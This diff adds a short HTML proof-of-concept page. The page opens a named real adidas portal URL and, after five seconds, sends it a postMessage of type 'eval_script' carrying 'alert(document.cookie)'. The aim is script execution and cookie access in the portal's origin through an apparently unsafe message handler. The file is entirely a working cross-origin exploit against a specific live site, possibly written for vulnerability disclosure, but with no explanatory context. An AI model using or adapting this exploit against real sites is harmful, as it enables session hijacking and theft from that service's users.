@@ -1,0 +1,10 @@
+<html>
+<body>
+<script>
+hwin = window.open("https://adifox.adidas.com.cn/portal/#/");
+setTimeout(function(){
+ hwin.postMessage('{"type":"eval_script","content":"alert(document.cookie)"}',"*")
+},5000)
+</script>
+</body>
+</html>
